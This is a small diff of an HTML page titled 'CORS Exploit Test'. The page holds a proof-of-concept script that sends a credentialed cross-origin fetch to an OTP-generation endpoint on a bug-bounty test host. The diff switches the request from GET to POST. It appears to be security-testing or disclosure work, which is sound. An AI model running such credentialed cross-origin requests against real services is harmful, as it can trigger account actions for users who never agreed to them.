@@ -5,7 +5,7 @@
     <h1>CORS Exploit Test</h1>
     <script>
       fetch("https://api-uat-bugbounty.nonprod.syfe.com/auth/mobile-verification/generate-otp?locale=en-sg", {
-        method: "GET",
+        method: "POST",
         credentials: "include",
         headers: {
           "Content-Type": "application/json",
